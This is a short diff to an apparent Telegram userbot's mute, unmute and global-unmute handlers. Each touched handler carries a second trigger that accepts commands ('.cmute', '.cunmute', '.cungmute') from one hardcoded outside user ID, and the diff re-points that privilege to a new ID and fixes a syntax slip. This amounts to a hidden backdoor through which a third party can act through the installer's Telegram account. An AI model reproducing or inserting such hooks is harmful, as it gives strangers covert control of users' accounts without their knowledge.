@@ -306,7 +306,7 @@ async def nothanos(unbon):
 
 
 @register(outgoing=True, pattern=r"^\.mute(?: |$)(.*)")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.cmute$")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cmute$")
 async def spider(spdr):
     # Check if the function running under SQL mode
     try:
@@ -361,7 +361,7 @@ async def spider(spdr):
 
 
 @register(outgoing=True, pattern=r"^\.unmute(?: |$)(.*)")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.cunmute$")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cunmute$")
 async def unmoot(unmot):
     # Admin or creator check
     chat = await unmot.get_chat()
@@ -438,7 +438,7 @@ async def muter(moot):
 
 
 @register(outgoing=True, pattern=r"^\.ungmute(?: |$)(.*)")
-@register(incoming=True, from_users1694909518, pattern=r"^\.cungmute$")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cungmute$")
 async def ungmoot(un_gmute):
     # Admin or creator check
     chat = await un_gmute.get_chat()
